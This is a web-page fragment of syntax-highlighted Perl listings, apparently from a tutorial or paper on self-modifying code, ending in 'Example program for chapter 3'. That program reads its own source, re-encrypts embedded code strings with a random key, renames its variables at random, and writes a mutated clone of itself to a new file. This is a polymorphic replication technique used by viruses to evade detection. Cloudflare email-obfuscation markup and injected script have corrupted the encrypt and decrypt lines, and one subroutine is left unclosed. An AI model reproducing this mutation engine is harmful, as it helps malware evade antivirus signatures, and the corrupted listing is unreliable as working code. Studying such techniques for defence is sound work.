&nbsp; <span style="color: #cc66cc;">42</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$coin</span> <span style="color: #339933;">==</span> <span style="color: #cc66cc;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/ / /g</span><span style="color: #339933;">;</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">43</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$coin</span> <span style="color: #339933;">==</span> <span style="color: #cc66cc;">1</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/ / &nbsp;/g</span><span style="color: #339933;">;</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">44</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/ &nbsp;/g</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">45</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<h3><a name="pa2"></a>A.2 Example program for chapter 3</h3>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a> <span style="color: black;">&#40;</span>SELF<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&lt;$0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">@self</span> <span style="color: #339933;">=</span> <span style="color: #009999;">&lt;SELF&gt;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">3</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a> <span style="color: black;">&#40;</span>SELF<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">4</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">5</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$code</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;IAWKJAqAI2aKHKJ8ahk8JAd&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">6</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$code</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">1</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;ZK<span style="color: #000099; font-weight: bold;">\@</span>A<span style="color: #000099; font-weight: bold;">\@</span>8kG8lJA8bAI2aKHKJ&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">7</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$lenofen</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@code</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">8</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">9</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$rotate</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">34125</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">10</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">11</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">$rotreplace</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">500000</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">12</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">13</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">@switchthese</span> <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;OUT2FILE&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; <span style="color: #ff0000;">&quot;SELF&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">14</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;addspacing&quot;</span><span style="color: #339933;">,</span> &nbsp; <span style="color: #ff0000;">&quot;createsubstitutes&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">15</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;encrypt&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">&quot;decrypt&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">16</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;code&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;coin&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;counter&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">17</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;enccounter&quot;</span><span style="color: #339933;">,</span> &nbsp; <span style="color: #ff0000;">&quot;entry&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">&quot;length&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">18</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;lenofen&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">&quot;line&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;randomchar&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">19</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;randomlen&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp;<span style="color: #ff0000;">&quot;randomvar&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp;<span style="color: #ff0000;">&quot;rotate&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">20</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;rotreplace&quot;</span><span style="color: #339933;">,</span> &nbsp; <span style="color: #ff0000;">&quot;self&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;swcounter&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">21</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;switchthese&quot;</span><span style="color: #339933;">,</span> &nbsp;<span style="color: #ff0000;">&quot;variable&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">22</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">23</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">&amp;createsubstitutes</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">24</span> <span style="color: #339933;">:</span><br/>
&nbsp; <span style="color: #cc66cc;">25</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">$dev</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;dev&quot;</span> <span style="color: #339933;">.</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">500</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">26</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;Spawned a clone to $dev<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">27</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">28</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a> <span style="color: black;">&#40;</span>OUT2FILE<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&gt;$dev&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">29</span> <span style="color: #339933;">:</span> <span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$line</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@self</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">30</span> <span style="color: #339933;">:</span> &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">/$rotate/</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">'$rotate = '</span> <span style="color: #339933;">.</span> <span style="color: #ff0000;">&quot;$rotreplace;<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">31</span> <span style="color: #339933;">:</span> &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$enccounter</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$enccounter</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$lenofen</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$enccounter</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">32</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">/^\$code\[$enccounter\]/</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">33</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$oldc</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">&amp;decrypt</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$code</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$enccounter</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">34</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;$oldc<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">35</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$newc</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">&amp;encrypt</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$oldc</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">36</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">'$code['</span> <span style="color: #339933;">.</span> <span style="color: #ff0000;">&quot;$enccounter] = <span style="color: #000099; font-weight: bold;">\&quot;</span>$newc<span style="color: #000099; font-weight: bold;">\&quot;</span>;<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">37</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/\@/\\\@/g</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">38</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;$line&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">39</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">40</span> <span style="color: #339933;">:</span> &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">41</span> <span style="color: #339933;">:</span> &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$swcounter</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$swcounter</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$length</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$swcounter</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">42</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/$switchthese[$swcounter]/$randomvar[$swcounter]/g</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">43</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">&amp;addspacing</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">44</span> <span style="color: #339933;">:</span> &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">45</span> <span style="color: #339933;">:</span> &nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> OUT2FILE <span style="color: #0000ff;">$line</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">46</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">47</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a> <span style="color: black;">&#40;</span>OUT2FILE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">48</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">49</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> createsubstitutes <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">50</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$length</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@switchthese</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$length</span><span style="color: #339933;">--;</span><br/>
&nbsp; <span style="color: #cc66cc;">51</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$counter</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$counter</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$length</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$counter</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">52</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$randomlen</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">4</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">53</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$randomlen</span> <span style="color: #339933;">+=</span> <span style="color: #cc66cc;">5</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">54</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$variable</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$variable</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$randomlen</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$variable</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">55</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$randomchar</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">26</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">56</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$randomchar</span> <span style="color: #339933;">+=</span> <span style="color: #cc66cc;">97</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">57</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$randomvar</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$counter</span><span style="color: black;">&#93;</span> <span style="color: #339933;">.=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/chr.html"><span style="color: #000066;">chr</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$randomchar</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">58</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">59</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">60</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">61</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">62</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> addspacing <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">63</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$coin</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">3</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">64</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$coin</span> <span style="color: #339933;">==</span> <span style="color: #cc66cc;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/ / /g</span><span style="color: #339933;">;</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">65</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$coin</span> <span style="color: #339933;">==</span> <span style="color: #cc66cc;">1</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/ / &nbsp;/g</span><span style="color: #339933;">;</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">66</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/ &nbsp;/g</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">67</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">68</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> encrypt <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">69</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">my</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$toencrypt</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@_</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">70</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$rotreplace</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">71</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$toencrypt</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;"><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="96e2e4b9f7bbecd6d7bbccb8a6bbaf">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/0-9.@A-Za-z/</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">72</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">73</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/return.html"><span style="color: #000066;">return</span></a> <span style="color: #0000ff;">$toencrypt</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">74</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">75</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">76</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> decrypt <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">77</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">my</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$todecrypt</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@_</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">78</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$rotate</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">79</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$todecrypt</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">tr/0-9.@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="52137f08337f287d337f2812137f087c627f6b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">80</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
